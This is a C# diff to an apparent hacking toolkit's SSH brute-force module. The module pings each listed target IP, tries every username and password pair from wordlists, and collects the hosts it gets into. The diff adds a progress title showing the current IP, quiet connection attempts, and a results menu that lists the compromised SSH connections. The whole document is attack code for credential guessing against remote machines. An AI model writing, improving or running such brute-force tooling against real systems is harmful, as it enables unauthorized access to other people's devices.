@@ -24,6 +24,11 @@ namespace HackTools
             generateRange,
             tryAccessByRange
         }
+        enum AttackResultOptions
+        {
+            exit,
+            viewAsList
+        }
         public override void Open()
         {
             Menu<Options>.MenuItem[] items = new Menu<Options>.MenuItem[]
@@ -137,6 +142,7 @@ namespace HackTools
             {
                 List<SSHConnection> connections = new List<SSHConnection>();
                 int current = 0;
+                string currentIp = "";
 
                 CancellationTokenSource cancellationToken = new CancellationTokenSource();
                 Task loadingTask = Task.Run(() => {
@@ -144,16 +150,19 @@ namespace HackTools
                     while(true)
                     {
                         if (cancellationToken.IsCancellationRequested) return;
-                        loading.title = $"Trying {current}/{targets.GetItems().Count() * usernames.GetItems().Count() * passwords.GetItems().Count()}";
+                        loading.title = $"Trying {current}/{targets.GetItems().Count()} ({currentIp})";
                         loading.Print();
                         Thread.Sleep(200);
                     }
                 }, cancellationToken.Token);
 
+                // Try all combinations
                 foreach(IPAndNamesList ip in targets.GetItems())
                 {
+                    current++;
+                    currentIp = ip.GetName();
                     Ping ping = new Ping();
-                    PingReply reply = ping.Send(ip.GetName());
+                    PingReply reply = ping.Send(currentIp);
                     if (reply.Status != IPStatus.Success) continue;
 
                     bool connected = false;
@@ -162,8 +171,8 @@ namespace HackTools
                     {
                         foreach(string password in passwords.GetItems().Select((p) => p.GetValue()).ToArray())
                         {
-                            connection = new SSHConnection(username, password, ip.GetName());
-                            if (connection.Connect()) connected = true;
+                            connection = new SSHConnection(username, password, currentIp);
+                            if (connection.Connect(displayUI: false)) connected = true;
                         }
                         if (connected) break;
                     }
@@ -172,24 +181,43 @@ namespace HackTools
                 }
 
                 cancellationToken.Cancel();
-                cancellationToken.Dispose();
-                Menu<SSHConnection> menu = new Menu<SSHConnection>(title: "Successful connections", items: connections.Select((c) => new Menu<SSHConnection>.MenuItem(c.ip,c)).ToArray());
+                Console.ForegroundColor = ConsoleColor.White;
+
+                // Once it tried all connections
+
                 if(connections.Count <= 0)
                 {
                     Console.Clear();
-
                     Printer.Print("&red;The program was unable to connect to any device via SSH (using the specified targets, usernames and passwords)");
-
                     UIComponents.PressAnyKey();
                     return;
                 }
+
+                // Display
+
+                Menu<AttackResultOptions> menu = new Menu<AttackResultOptions>(title: "Results", items: new Menu<AttackResultOptions>.MenuItem[] {
+                    new Menu<AttackResultOptions>.MenuItem("View results as list", AttackResultOptions.viewAsList)
+                });
+
                 do
                 {
-                    SSHConnection connection = menu.DisplayMenu();
-                    if(connection == null)
+                    AttackResultOptions option = menu.DisplayMenu();
+
+                    switch(option)
                     {
-                        Printer.Print("&cyan; [?] Are you sure you want to exit?");
-                        if (UIComponents.GetYesNo()) return;
+                        case AttackResultOptions.viewAsList:
+                            ListGenerator<SSHConnectionsList, SSHConnection> sshConnectionsList = new ListGenerator<SSHConnectionsList, SSHConnection>();
+                            sshConnectionsList.Set(connections.Select((c) => {
+                                SSHConnectionsList connectionsList = new SSHConnectionsList();
+                                connectionsList.SetValue(c);
+                                return connectionsList;
+                            }).ToArray());
+                            sshConnectionsList.Modify();
+                            break;
+                        default:
+                            Printer.Print("&cyan; [?] Are you sure you want to exit?");
+                            if (UIComponents.GetYesNo()) return;
+                            break;
                     }
                 } while (true);
             }
